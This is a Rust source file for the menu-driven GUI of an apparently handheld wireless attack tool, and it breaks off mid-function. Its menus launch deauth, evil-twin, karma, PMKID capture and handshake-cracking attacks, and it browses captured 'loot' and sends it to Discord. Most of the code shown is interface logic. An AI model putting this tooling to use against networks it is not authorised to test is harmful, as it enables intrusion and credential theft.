use std::{
    fs,
    fs::File,
    io::{BufRead, BufReader, Write},
    path::{Path, PathBuf},
    process::Command,
    thread,
    time::{Duration, SystemTime, Instant},
    sync::mpsc::{self, TryRecvError},
};

use anyhow::{Result, bail, Context, anyhow};
use rustyjack_core::cli::{
    Commands, DiscordCommand, DiscordSendArgs,
    HardwareCommand, LootCommand, 
    LootReadArgs, NotifyCommand,
    WifiCommand, WifiDeauthArgs, WifiRouteCommand, WifiScanArgs, 
    WifiStatusArgs, WifiProfileCommand, WifiProfileConnectArgs, WifiProfileDeleteArgs, EthernetCommand, EthernetDiscoverArgs, EthernetPortScanArgs, HotspotCommand, HotspotStartArgs,
};
use rustyjack_core::InterfaceSummary;
use serde::Deserialize;
use serde_json::{self, Value};
use chrono::Local;
use tempfile::{NamedTempFile, TempPath};
use walkdir::WalkDir;
use zip::{CompressionMethod, ZipWriter, write::FileOptions};

#[cfg(target_os = "linux")]
use rustyjack_wireless::{
    crack::{WpaCracker, CrackProgress, CrackResult, CrackerConfig, generate_common_passwords, generate_ssid_passwords},
    handshake::HandshakeExport,
};

use crate::{
    config::GuiConfig,
    core::CoreBridge,
    display::{Display, DashboardView, StatusOverlay},
    input::{Button, ButtonPad},
    menu::{ColorTarget, LootSection, MenuAction, MenuEntry, MenuTree, PipelineType, TxPowerSetting, menu_title},
    stats::StatsSampler,
};

// Response types for WiFi operations
#[derive(Debug, Deserialize)]
struct WifiNetworkEntry {
    ssid: Option<String>,
    bssid: Option<String>,
    signal_dbm: Option<i32>,
    channel: Option<u8>,
    encrypted: bool,
}

#[derive(Debug, Deserialize)]
struct WifiScanResponse {
    networks: Vec<WifiNetworkEntry>,
    count: usize,
}

#[derive(Debug, Deserialize)]
struct WifiProfileSummary {
    ssid: String,
    #[serde(default)]
    interface: Option<String>,
}

#[derive(Debug, Deserialize)]
struct WifiProfilesResponse {
    profiles: Vec<WifiProfileSummary>,
}

#[derive(Debug, Deserialize)]
struct WifiListResponse {
    interfaces: Vec<InterfaceSummary>,
}

#[derive(Debug, Deserialize)]
struct RouteSnapshot {
    #[serde(default)]
    default_gateway: Option<String>,
    #[serde(default)]
    default_interface: Option<String>,
}

#[derive(Debug, Deserialize)]
struct WifiStatusOverview {
    #[serde(default)]
    connected: bool,
    #[serde(default)]
    ssid: Option<String>,
    #[serde(default)]
    interface: Option<String>,
    #[serde(default)]
    signal_dbm: Option<i32>,
}

#[cfg(target_os = "linux")]
#[derive(Deserialize)]
struct HandshakeBundle {
    ssid: String,
    handshake: HandshakeExport,
}

#[cfg(target_os = "linux")]
#[derive(Clone)]
enum DictionaryOption {
    Quick { total: u64 },
    SsidPatterns { total: u64 },
    Bundled { name: String, path: PathBuf, total: u64 },
}

#[cfg(target_os = "linux")]
impl DictionaryOption {
    fn label(&self) -> String {
        match self {
            DictionaryOption::Quick { total } => format!("Quick (common+SSID) [{}]", total),
            DictionaryOption::SsidPatterns { total } => format!("SSID patterns [{}]", total),
            DictionaryOption::Bundled { name, total, .. } => {
                format!("{} [{}]", name, total)
            }
        }
    }
}

#[cfg(target_os = "linux")]
enum CrackUpdate {
    Progress {
        attempts: u64,
        total: u64,
        rate: f32,
        current: String,
    },
    Done {
        password: Option<String>,
        attempts: u64,
        total: u64,
        cancelled: bool,
    },
    Error(String),
}

#[cfg(target_os = "linux")]
struct CrackOutcome {
    password: Option<String>,
    attempts: u64,
    total_attempts: u64,
    elapsed: Duration,
    cancelled: bool,
}

pub struct App {
    core: CoreBridge,
    display: Display,
    buttons: ButtonPad,
    config: GuiConfig,
    menu: MenuTree,
    menu_state: MenuState,
    stats: StatsSampler,
    root: PathBuf,
    dashboard_view: Option<DashboardView>,
}

/// Result of checking for cancel during an attack
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum CancelAction {
    Continue,      // User wants to continue attack
    GoBack,        // User wants to go back one menu
    GoMainMenu,    // User wants to go to main menu
}

/// Result from pipeline execution
struct PipelineResult {
    cancelled: bool,
    steps_completed: usize,
    pmkids_captured: u32,
    handshakes_captured: u32,
    password_found: Option<String>,
    networks_found: u32,
    clients_found: u32,
}

enum StepOutcome {
    Completed(Option<(u32, u32, Option<String>, u32, u32)>),
    Skipped(String),
}

// Map low-level Button values to higher-level ButtonAction values
impl App {
    fn map_button(&self, b: Button) -> ButtonAction {
        match b {
            Button::Up => ButtonAction::Up,
            Button::Down => ButtonAction::Down,
            Button::Left => ButtonAction::Back,
            Button::Right | Button::Select => ButtonAction::Select,
            Button::Key1 => ButtonAction::Refresh,
            Button::Key2 => ButtonAction::MainMenu,
            Button::Key3 => ButtonAction::Reboot,
        }
    }

    fn status_overlay(&self) -> StatusOverlay {
        let mut status = self.stats.snapshot();
        let settings = &self.config.settings;

        status.target_network = settings.target_network.clone();
        status.target_bssid = settings.target_bssid.clone();
        status.target_channel = settings.target_channel;
        status.active_interface = settings.active_network_interface.clone();

        let interface_mac = self.read_interface_mac(&settings.active_network_interface);
        let current_mac = interface_mac
            .clone()
            .unwrap_or_else(|| settings.current_mac.clone());
        let original_mac = if !settings.original_mac.is_empty() {
            settings.original_mac.clone()
        } else {
            interface_mac.unwrap_or_else(|| current_mac.clone())
        };

        status.current_mac = current_mac.to_uppercase();
        status.original_mac = original_mac.to_uppercase();

        status
    }

    fn read_interface_mac(&self, interface: &str) -> Option<String> {
        if interface.is_empty() {
            return None;
        }
        let path = format!("/sys/class/net/{}/address", interface);
        fs::read_to_string(&path).ok().map(|mac| mac.trim().to_uppercase())
    }

    fn is_ethernet_interface(&self, interface: &str) -> bool {
        if interface.is_empty() {
            return false;
        }
        let wireless_dir = format!("/sys/class/net/{}/wireless", interface);
        !Path::new(&wireless_dir).exists()
    }

    fn interface_has_carrier(&self, interface: &str) -> bool {
        if interface.is_empty() {
            return false;
        }
        let carrier_path = format!("/sys/class/net/{}/carrier", interface);
        match fs::read_to_string(&carrier_path) {
            Ok(val) => val.trim() == "1",
            Err(_) => false,
        }
    }

    fn confirm_reboot(&mut self) -> Result<()> {
        // Ask the user to confirm reboot — waits for explicit confirmation
        let overlay = self.stats.snapshot();
        let content = vec![
            "Confirm reboot".to_string(),
            "SELECT = Reboot".to_string(),
            "LEFT = Cancel".to_string(),
        ];

        self.display.draw_dialog(&content, &overlay)?;

        loop {
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Select => {
                    // Run reboot command and then exit
                    let _ = Command::new("systemctl").arg("reboot").status();
                    // If the command succeeded the system will reboot; exit the app regardless.
                    std::process::exit(0);
                }
                ButtonAction::Back | ButtonAction::MainMenu => {
                    // Cancel and return
                    break;
                }
                ButtonAction::Refresh => {
                    // redraw the dialog
                    self.display.draw_dialog(&content, &overlay)?;
                }
                _ => {}
            }
        }
        Ok(())
    }

    /// Check if user pressed cancel button during attack, show confirmation dialog
    fn check_attack_cancel(&mut self, attack_name: &str) -> Result<CancelAction> {
        // Non-blocking check for button press
        if let Some(button) = self.buttons.try_read()? {
            let action = self.map_button(button);
            match action {
                ButtonAction::Back => {
                    return self.confirm_cancel_attack(attack_name, CancelAction::GoBack);
                }
                ButtonAction::MainMenu => {
                    return self.confirm_cancel_attack(attack_name, CancelAction::GoMainMenu);
                }
                _ => {}
            }
        }
        Ok(CancelAction::Continue)
    }

    /// Show cancel confirmation dialog
    fn confirm_cancel_attack(&mut self, attack_name: &str, cancel_to: CancelAction) -> Result<CancelAction> {
        let overlay = self.stats.snapshot();
        let dest = match cancel_to {
            CancelAction::GoBack => "previous menu",
            CancelAction::GoMainMenu => "main menu",
            CancelAction::Continue => return Ok(CancelAction::Continue),
        };
        
        let content = vec![
            format!("Cancel {}?", attack_name),
            "".to_string(),
            format!("Return to {}", dest),
            "".to_string(),
            "SELECT = Cancel attack".to_string(),
            "LEFT = Continue attack".to_string(),
        ];
        
        self.display.draw_dialog(&content, &overlay)?;
        
        loop {
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Select => {
                    // User confirmed cancel
                    return Ok(cancel_to);
                }
                ButtonAction::Back | ButtonAction::Refresh => {
                    // User wants to continue attack
                    return Ok(CancelAction::Continue);
                }
                ButtonAction::MainMenu => {
                    // Change to go to main menu instead
                    return Ok(CancelAction::GoMainMenu);
                }
                _ => {}
            }
        }
    }

    /// Run a command with cancel support - shows progress and allows user to cancel
    /// Returns Ok(Some(result)) if completed, Ok(None) if cancelled
    fn dispatch_cancellable(
        &mut self,
        attack_name: &str,
        cmd: Commands,
        duration_secs: u64,
    ) -> Result<Option<(String, serde_json::Value)>> {
        use std::sync::{Arc, Mutex};
        use std::thread;
        use std::time::Duration;
        
        let core = self.core.clone();
        let result: Arc<Mutex<Option<Result<(String, serde_json::Value)>>>> = Arc::new(Mutex::new(None));
        let result_clone = Arc::clone(&result);
        
        // Spawn command in background
        thread::spawn(move || {
            let r = core.dispatch(cmd);
            *result_clone.lock().unwrap() = Some(r);
        });
        
        let start = std::time::Instant::now();
        let mut last_displayed_secs: u64 = u64::MAX; // Force initial draw
        
        loop {
            let elapsed = start.elapsed().as_secs();
            
            // Check for cancel (non-blocking button check)
            match self.check_attack_cancel(attack_name)? {
                CancelAction::Continue => {}
                CancelAction::GoBack => {
                    self.show_message(&format!("{} Cancelled", attack_name), [
                        "Attack stopped early",
                        "",
                        "Partial results may be",
                        "saved in loot folder"
                    ])?;
                    return Ok(None);
                }
                CancelAction::GoMainMenu => {
                    self.menu_state.home();
                    self.show_message(&format!("{} Cancelled", attack_name), [
                        "Attack stopped early",
                        "",
                        "Partial results may be",
                        "saved in loot folder"
                    ])?;
                    return Ok(None);
                }
            }
            
            // Check if completed
            if let Some(r) = result.lock().unwrap().take() {
                return Ok(Some(r?));
            }
            
            // Only redraw if seconds changed (reduces flicker significantly)
            if elapsed != last_displayed_secs {
                last_displayed_secs = elapsed;
                
                let progress = if duration_secs > 0 {
                    (elapsed as f32 / duration_secs as f32).min(1.0) * 100.0
                } else {
                    0.0
                };
                
                let msg = if duration_secs > 0 && elapsed < duration_secs {
                    format!("{}s/{}s [LEFT=Cancel]", elapsed, duration_secs)
                } else if duration_secs > 0 {
                    "Finalizing... [LEFT=Cancel]".to_string()
                } else {
                    "Running... [LEFT=Cancel]".to_string()
                };
                
                let overlay = self.stats.snapshot();
                self.display.draw_progress_dialog(attack_name, &msg, progress, &overlay)?;
            }
            
            // Sleep briefly between button checks (50ms for responsive cancellation)
            thread::sleep(Duration::from_millis(50));
        }
    }
}

struct MenuState {
    stack: Vec<String>,
    selection: usize,
    // Scroll offset for current menu view — ensures selection stays visible
    offset: usize,
}

impl MenuState {
    fn new() -> Self {
        Self {
            stack: vec!["a".to_string()],
            selection: 0,
            offset: 0,
        }
    }

    fn current_id(&self) -> &str {
        self.stack.last().map(|s| s.as_str()).unwrap_or("a")
    }

    fn enter(&mut self, id: &str) {
        self.stack.push(id.to_string());
        self.selection = 0;
        self.offset = 0;
    }

    fn back(&mut self) {
        if self.stack.len() > 1 {
            self.stack.pop();
            self.selection = 0;
            self.offset = 0;
        }
    }

    fn move_up(&mut self, total: usize) {
        if total == 0 {
            self.selection = 0;
            return;
        }
        if self.selection == 0 {
            self.selection = total - 1;
        } else {
            self.selection -= 1;
        }
        // Ensure selection is inside visible window
        const VISIBLE: usize = 7;
        if self.selection < self.offset {
            self.offset = self.selection;
        } else if self.selection >= self.offset + VISIBLE {
            self.offset = self.selection.saturating_sub(VISIBLE - 1);
        }
    }

    fn move_down(&mut self, total: usize) {
        if total == 0 {
            self.selection = 0;
            return;
        }
        self.selection = (self.selection + 1) % total;
        // Ensure selection is inside visible window
        const VISIBLE: usize = 7;
        if self.selection < self.offset {
            self.offset = self.selection;
        } else if self.selection >= self.offset + VISIBLE {
            self.offset = self.selection.saturating_sub(VISIBLE - 1);
        }
    }

    fn home(&mut self) {
        self.stack = vec!["a".to_string()];
        self.selection = 0;
        self.offset = 0;
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ButtonAction {
    Up,
    Down,
    Back,
    Select,
    Refresh,
    MainMenu,
    Reboot,
}

impl App {
    pub fn new() -> Result<Self> {
        let core = CoreBridge::with_root(None)?;
        let root = core.root().to_path_buf();
        let config = GuiConfig::load(&root)?;
        let mut display = Display::new(&config.colors)?;
        let buttons = ButtonPad::new(&config.pins)?;
        
        // Show splash screen during initialization
        let splash_path = root.join("img").join("rustyjack.png");
        let _ = display.show_splash_screen(&splash_path);
        
        // Let splash show while stats sampler starts up
        let stats = StatsSampler::spawn(core.clone());
        
        // Give splash screen time to be visible (1.5 seconds)
        thread::sleep(Duration::from_millis(1500));

        Ok(Self {
            core,
            display,
            buttons,
            config,
            menu: MenuTree::new(),
            menu_state: MenuState::new(),
            stats,
            root,
            dashboard_view: None,
        })
    }

    pub fn run(mut self) -> Result<()> {
        loop {
            if let Some(view) = self.dashboard_view {
                // Dashboard mode
                let status = self.status_overlay();
                self.display.draw_dashboard(view, &status)?;
                
                let button = self.buttons.wait_for_press()?;
                match self.map_button(button) {
                    ButtonAction::Back => {
                        // Exit dashboard, return to menu
                        self.dashboard_view = None;
                    }
                    ButtonAction::Select => {
                        // Cycle to next dashboard
                        self.dashboard_view = Some(match view {
                            DashboardView::SystemHealth => DashboardView::TargetStatus,
                            DashboardView::TargetStatus => DashboardView::MacStatus,
                            DashboardView::MacStatus => DashboardView::SystemHealth,
                        });
                    }
                    ButtonAction::Refresh => {
                        // force redraw; nothing else required (loop will redraw)
                    }
                    ButtonAction::MainMenu => {
                        // Exit dashboard and go to main menu
                        self.dashboard_view = None;
                        self.menu_state.home();
                    }
                    ButtonAction::Reboot => {
                        self.confirm_reboot()?;
                    }
                    _ => {}
                }
            } else {
                // Menu mode
                let entries = self.render_menu()?;
                let button = self.buttons.wait_for_press()?;
                match self.map_button(button) {
                    ButtonAction::Up => self.menu_state.move_up(entries.len()),
                    ButtonAction::Down => self.menu_state.move_down(entries.len()),
                    ButtonAction::Back => self.menu_state.back(),
                    ButtonAction::Select => {
                        if let Some(entry) = entries.get(self.menu_state.selection) {
                            let action = entry.action.clone();
                            self.execute_action(action)?;
                        }
                    }
                    ButtonAction::Refresh => {
                        // Force refresh — nothing required here because the loop redraws
                    }
                    ButtonAction::MainMenu => self.menu_state.home(),
                    ButtonAction::Reboot => self.confirm_reboot()?,
                }
            }
        }
    }

    fn render_menu(&mut self) -> Result<Vec<MenuEntry>> {
        let mut entries = self.menu.entries(self.menu_state.current_id())?;
        
        // Dynamic label updates based on current settings
        for entry in &mut entries {
            match &entry.action {
                MenuAction::ToggleDiscord => {
                    let state = if self.config.settings.discord_enabled { "ON" } else { "OFF" };
                    entry.label = format!("Discord [{}]", state);
                }
                MenuAction::ToggleMacRandomization => {
                    let state = if self.config.settings.mac_randomization_enabled { "ON" } else { "OFF" };
                    entry.label = format!("Auto MAC [{}]", state);
                }
                MenuAction::TogglePassiveMode => {
                    let state = if self.config.settings.passive_mode_enabled { "ON" } else { "OFF" };
                    entry.label = format!("Passive [{}]", state);
                }
                MenuAction::SetTxPower(level) => {
                    let (base, key) = Self::tx_power_label(*level);
                    let active = self.config.settings.tx_power_level.eq_ignore_ascii_case(key);
                    let prefix = if active { "*" } else { " " };
                    entry.label = format!("{} {}", prefix, base);
                }
                _ => {}
            }
        }

        if entries.is_empty() {
            entries.push(MenuEntry {
                label: " Nothing here".to_string(),
                action: MenuAction::ShowInfo,
            });
        }
        if self.menu_state.selection >= entries.len() {
            self.menu_state.selection = entries.len().saturating_sub(1);
        }
        let status = self.status_overlay();
        // When there are more entries than fit on-screen, show a sliding window
        // so the selected item is always visible. MenuState::offset tracks the
        // first item index in the current view.
        const VISIBLE: usize = 9;
        let total = entries.len();
        if self.menu_state.selection >= total && total > 0 {
            self.menu_state.selection = total - 1;
        }
        // clamp offset
        if self.menu_state.offset >= total {
            self.menu_state.offset = 0;
        }

        let start = self.menu_state.offset.min(total);
        let _end = (start + VISIBLE).min(total);

        let labels: Vec<String> = entries
            .iter()
            .skip(start)
            .take(VISIBLE)
            .map(|entry| entry.label.clone())
            .collect();

        // selected index relative to the slice
        let displayed_selected = if total == 0 { 0 } else { self.menu_state.selection.saturating_sub(start) };

        self.display.draw_menu(
            menu_title(self.menu_state.current_id()),
            &labels,
            displayed_selected,
            &status,
        )?;
        Ok(entries)
    }

    fn execute_action(&mut self, action: MenuAction) -> Result<()> {
        match action {
            MenuAction::Submenu(id) => self.menu_state.enter(id),
            MenuAction::RefreshConfig => self.reload_config()?,
            MenuAction::SaveConfig => self.save_config()?,
            MenuAction::SetColor(target) => self.pick_color(target)?,
            MenuAction::RestartSystem => self.restart_system()?,
            MenuAction::Loot(section) => self.show_loot(section)?,
            MenuAction::DiscordUpload => self.discord_upload()?,
            MenuAction::ViewDashboards => {
                self.dashboard_view = Some(DashboardView::SystemHealth);
            }
            MenuAction::ToggleDiscord => self.toggle_discord()?,
            MenuAction::TransferToUSB => self.transfer_to_usb()?,
            MenuAction::HardwareDetect => self.show_hardware_detect()?,
            MenuAction::InstallWifiDrivers => self.install_wifi_drivers()?,
            MenuAction::ScanNetworks => self.scan_wifi_networks()?,
            MenuAction::DeauthAttack => self.launch_deauth_attack()?,
            MenuAction::ConnectKnownNetwork => self.connect_known_network()?,
            MenuAction::EvilTwinAttack => self.launch_evil_twin()?,
            MenuAction::ProbeSniff => self.launch_probe_sniff()?,
            MenuAction::PmkidCapture => self.launch_pmkid_capture()?,
            MenuAction::CrackHandshake => self.launch_crack_handshake()?,
            MenuAction::KarmaAttack => self.launch_karma_attack()?,
            MenuAction::AttackPipeline(pipeline_type) => self.launch_attack_pipeline(pipeline_type)?,
            MenuAction::ToggleMacRandomization => self.toggle_mac_randomization()?,
            MenuAction::RandomizeMacNow => self.randomize_mac_now()?,
            MenuAction::RestoreMac => self.restore_mac()?,
            MenuAction::SetTxPower(level) => self.set_tx_power(level)?,
            MenuAction::TogglePassiveMode => self.toggle_passive_mode()?,
            MenuAction::PassiveRecon => self.launch_passive_recon()?,
            MenuAction::EthernetDiscovery => self.launch_ethernet_discovery()?,
            MenuAction::EthernetPortScan => self.launch_ethernet_port_scan()?,
            MenuAction::Hotspot => self.manage_hotspot()?,
            MenuAction::ShowInfo => {} // No-op for informational entries
        }
        Ok(())
    }

    fn simple_command(&mut self, command: Commands, success: &str) -> Result<()> {
        if let Err(err) = self.core.dispatch(command) {
            self.show_message("Error", [format!("{err}")])?;
        } else {
            self.show_message("Success", [success.to_string()])?;
        }
        Ok(())
    }

    fn show_message<I, S>(&mut self, title: &str, lines: I) -> Result<()>
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        let overlay = self.stats.snapshot();
        let content: Vec<String> = std::iter::once(title.to_string())
            .chain(lines.into_iter().map(|line| line.as_ref().to_string()))
            .collect();
        // Draw the dialog and require an explicit button press to dismiss
        self.display.draw_dialog(&content, &overlay)?;
        loop {
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Select | ButtonAction::Back => break,
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    break;
                }
                ButtonAction::Refresh => {
                    // redraw the dialog so user can refresh view content if desired
                    self.display.draw_dialog(&content, &overlay)?;
                }
                ButtonAction::Reboot => {
                    // confirm and perform reboot if accepted
                    self.confirm_reboot()?;
                    break;
                }
                _ => {}
            }
        }
        Ok(())
    }
    
    fn show_progress<I, S>(&mut self, title: &str, lines: I) -> Result<()>
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        let overlay = self.stats.snapshot();
        let content: Vec<String> = std::iter::once(title.to_string())
            .chain(lines.into_iter().map(|line| line.as_ref().to_string()))
            .collect();
        self.display.draw_dialog(&content, &overlay)?;
        Ok(())
    }
    
    fn execute_with_progress<F, T>(&mut self, title: &str, message: &str, operation: F) -> Result<T>
    where
        F: FnOnce() -> Result<T>,
    {
        self.show_progress(title, [message, "Please wait..."])?;
        let result = operation();
        result
    }

    fn reload_config(&mut self) -> Result<()> {
        self.config = GuiConfig::load(&self.root)?;
        self.display.update_palette(&self.config.colors);
        self.show_message("Config", ["Reloaded"])
    }

    fn save_config(&mut self) -> Result<()> {
        self.config.save(&self.root.join("gui_conf.json"))?;
        self.show_message("Config", ["Saved"])
    }

    fn pick_color(&mut self, target: ColorTarget) -> Result<()> {
        // use common, unambiguous hex values so picked colours match names
        let choices = [
            ("White", "#FFFFFF"),
            ("Black", "#000000"),
            ("Green", "#00FF00"),
            ("Red", "#FF0000"),
            ("Blue", "#0000FF"),
            ("Navy", "#000080"),
            ("Purple", "#AA00FF"),
        ];
        let mut index = 0;
        loop {
            let overlay = self.stats.snapshot();
            let (name, hex) = choices[index];
            let label = format!("{:?}: {}", target, name);
            self.display.draw_dialog(&[label.clone()], &overlay)?;
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Back => index = (index + choices.len() - 1) % choices.len(),
                ButtonAction::Select => {
                    self.apply_color(target.clone(), hex);
                    self.display
                        .draw_dialog(&["Color updated".into()], &overlay)?;
                    thread::sleep(Duration::from_millis(600));
                    break;
                }
                ButtonAction::Reboot => {
                    self.confirm_reboot()?;
                }
                _ => {}
            }
        }
        Ok(())
    }

    fn apply_color(&mut self, target: ColorTarget, value: &str) {
        match target {
            ColorTarget::Background => self.config.colors.background = value.to_string(),
            ColorTarget::Border => self.config.colors.border = value.to_string(),
            ColorTarget::Text => self.config.colors.text = value.to_string(),
            ColorTarget::SelectedText => self.config.colors.selected_text = value.to_string(),
            ColorTarget::SelectedBackground => {
                self.config.colors.selected_background = value.to_string()
            }
        }
        self.display.update_palette(&self.config.colors);
    }

    fn tx_power_label(level: TxPowerSetting) -> (&'static str, &'static str) {
        match level {
            TxPowerSetting::Stealth => ("Stealth (1dBm)", "stealth"),
            TxPowerSetting::Low => ("Low (5dBm)", "low"),
            TxPowerSetting::Medium => ("Medium (12dBm)", "medium"),
            TxPowerSetting::High => ("High (18dBm)", "high"),
            TxPowerSetting::Maximum => ("Maximum", "maximum"),
        }
    }

    fn show_loot(&mut self, section: LootSection) -> Result<()> {
        let loot_base = match section {
            LootSection::Wireless => self.root.join("loot/Wireless"),
            LootSection::Ethernet => self.root.join("loot/Ethernet"),
        };

        if !loot_base.exists() {
            return self.show_message("Loot", ["No captures yet"]);
        }

        // Get list of network folders (or special folders like probe_sniff, karma)
        let mut networks: Vec<(String, PathBuf)> = Vec::new();
        
        if let Ok(entries) = std::fs::read_dir(&loot_base) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    if let Some(name) = path.file_name().and_then(|n| n.to_str()) {
                        networks.push((name.to_string(), path));
                    }
                }
            }
        }

        // Also check for any loose files directly in loot_base
        let mut loose_files: Vec<PathBuf> = Vec::new();
        if let Ok(entries) = std::fs::read_dir(&loot_base) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_file() {
                    loose_files.push(path);
                }
            }
        }

        if networks.is_empty() && loose_files.is_empty() {
            return self.show_message("Loot", ["No captures yet"]);
        }

        // Sort networks alphabetically
        networks.sort_by(|a, b| a.0.to_lowercase().cmp(&b.0.to_lowercase()));

        // Build menu - networks first, then loose files
        let mut labels: Vec<String> = networks.iter().map(|(name, _)| format!("[{}]", name)).collect();
        let mut paths: Vec<PathBuf> = networks.iter().map(|(_, p)| p.clone()).collect();
        
        // Add loose files at the end
        for file in &loose_files {
            if let Some(name) = file.file_name().and_then(|n| n.to_str()) {
                labels.push(name.to_string());
                paths.push(file.clone());
            }
        }

        loop {
            let Some(index) = self.choose_from_menu("Targets", &labels)? else {
                return Ok(());
            };

            let selected_path = &paths[index];
            
            if selected_path.is_dir() {
                // Show files in this network folder
                self.show_network_loot(selected_path)?;
            } else {
                // View the file directly
                self.view_loot_file(&selected_path.to_string_lossy())?;
            }
        }
    }

    /// Show loot files for a specific network/target
    fn show_network_loot(&mut self, network_dir: &Path) -> Result<()> {
        let network_name = network_dir
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("Unknown");

        self.browse_loot_dir(network_name, network_dir)
    }

    /// Generic directory browser for loot (shows dirs first, then files)
    fn browse_loot_dir(&mut self, title: &str, dir: &Path) -> Result<()> {
        let mut dirs: Vec<(String, PathBuf)> = Vec::new();
        let mut files: Vec<(String, PathBuf)> = Vec::new();

        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                let name = path
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("unknown")
                    .to_string();
                if path.is_dir() {
                    dirs.push((name, path));
                } else if path.is_file() {
                    files.push((name, path));
                }
            }
        }

        if dirs.is_empty() && files.is_empty() {
            return self.show_message(title, ["No files in this target"]);
        }

        dirs.sort_by(|a, b| a.0.to_lowercase().cmp(&b.0.to_lowercase()));
        files.sort_by(|a, b| a.0.to_lowercase().cmp(&b.0.to_lowercase()));

        let mut labels = Vec::new();
        let mut paths = Vec::new();
        let mut is_dir_flags = Vec::new();

        for (name, path) in &dirs {
            labels.push(format!("{}/", name));
            paths.push(path.clone());
            is_dir_flags.push(true);
        }
        for (name, path) in &files {
            labels.push(name.clone());
            paths.push(path.clone());
            is_dir_flags.push(false);
        }

        loop {
            let Some(index) = self.choose_from_menu(title, &labels)? else {
                return Ok(());
            };

            let path = &paths[index];
            if is_dir_flags[index] {
                let next_title = format!("{}/{}", title, path.file_name().and_then(|n| n.to_str()).unwrap_or(""));
                self.browse_loot_dir(&next_title, path)?;
            } else {
                self.view_loot_file(&path.to_string_lossy())?;
            }
        }
    }

    fn view_loot_file(&mut self, path: &str) -> Result<()> {
        // Read the file with a high line limit
        let read_args = LootReadArgs {
            path: PathBuf::from(path),
            max_lines: 5000,
        };
        let (_, data) = self
            .core
            .dispatch(Commands::Loot(LootCommand::Read(read_args)))?;
        
        let lines = data
            .get("lines")
            .and_then(Value::as_array)
            .map(|arr| {
                arr.iter()
                    .filter_map(Value::as_str)
                    .map(|s| s.to_string())
                    .collect::<Vec<_>>()
            })
            .unwrap_or_default();
        
        let truncated = data
            .get("truncated")
            .and_then(Value::as_bool)
            .unwrap_or(false);
        
        if lines.is_empty() {
            return self.show_message("Loot", ["File is empty"]);
        }
        
        let filename = Path::new(path)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("file")
            .to_string();
        
        // Scrollable file viewer
        self.scrollable_text_viewer(&filename, &lines, truncated)
    }
    
    fn scrollable_text_viewer(&mut self, title: &str, lines: &[String], truncated: bool) -> Result<()> {
        const LINES_PER_PAGE: usize = 9; // Reduced slightly to fit position indicator
        const MAX_TITLE_CHARS: usize = 15;
        
        let total_lines = lines.len();
        let mut line_offset = 0;
        let mut needs_redraw = true; // Track when redraw is needed
        
        // Clamp title without animation to avoid constant redraws
        let display_title = if title.len() > MAX_TITLE_CHARS {
            format!("{}...", &title[..MAX_TITLE_CHARS.saturating_sub(3)])
        } else {
            title.to_string()
        };
        
        loop {
            if needs_redraw {
                let overlay = self.stats.snapshot();
                let end = (line_offset + LINES_PER_PAGE).min(total_lines);
                let visible_lines: Vec<String> = lines[line_offset..end].to_vec();
                
                self.display.draw_file_viewer(
                    &display_title,
                    0,
                    &visible_lines,
                    line_offset,
                    total_lines,
                    truncated,
                    &overlay,
                )?;
                needs_redraw = false;
            }
            
            // Non-blocking button check with short timeout
            if let Some(button) = self.buttons.try_read_timeout(Duration::from_millis(100))? {
                match self.map_button(button) {
                    ButtonAction::Down => {
                        if line_offset + LINES_PER_PAGE < total_lines {
                            line_offset += 1;
                            needs_redraw = true;
                        }
                    }
                    ButtonAction::Up => {
                        if line_offset > 0 {
                            line_offset = line_offset.saturating_sub(1);
                            needs_redraw = true;
                        }
                    }
                    ButtonAction::Select => {
                        // Page down
                        if line_offset + LINES_PER_PAGE < total_lines {
                            line_offset = (line_offset + LINES_PER_PAGE).min(total_lines.saturating_sub(LINES_PER_PAGE));
                            needs_redraw = true;
                        }
                    }
                    ButtonAction::Back => {
                        return Ok(());
                    }
                    ButtonAction::MainMenu => {
                        self.menu_state.home();
                        return Ok(());
                    }
                    ButtonAction::Refresh => {
                        needs_redraw = true;
                    }
                    ButtonAction::Reboot => {
                        self.confirm_reboot()?;
                        needs_redraw = true;
                    }
                }
            }
        }
    }

    fn restart_system(&mut self) -> Result<()> {
        Command::new("reboot")
            .status()
            .ok();
        Ok(())
    }

    fn choose_from_list(&mut self, title: &str, items: &[String]) -> Result<Option<usize>> {
        if items.is_empty() {
            return Ok(None);
        }
        let mut index = 0usize;
        loop {
            let overlay = self.stats.snapshot();
            let content = vec![title.to_string(), items[index].clone()];
            self.display.draw_dialog(&content, &overlay)?;
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Up => {
                    if index == 0 {
                        index = items.len() - 1;
                    } else {
                        index -= 1;
                    }
                }
                ButtonAction::Down => index = (index + 1) % items.len(),
                ButtonAction::Select => return Ok(Some(index)),
                ButtonAction::Back => return Ok(None),
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    return Ok(None);
                }
                ButtonAction::Reboot => {
                    self.confirm_reboot()?;
                }
                _ => {}
            }
        }
    }

    /// Show a paginated menu (styled like the main menu) and return index
    fn choose_from_menu(&mut self, title: &str, items: &[String]) -> Result<Option<usize>> {
        if items.is_empty() {
            return Ok(None);
        }

        const VISIBLE: usize = 7;
        let mut index: usize = 0;
        let mut offset: usize = 0;

        loop {
            let total = items.len();
            // Clamp offset so selected is visible
            if index < offset {
                offset = index;
            } else if index >= offset + VISIBLE {
                offset = index.saturating_sub(VISIBLE - 1);
            }

            let overlay = self.stats.snapshot();

            // Build window slice of labels
            let slice: Vec<String> = items.iter().skip(offset).take(VISIBLE).cloned().collect();
            // Display menu with selected relative index
            let displayed_selected = index.saturating_sub(offset);
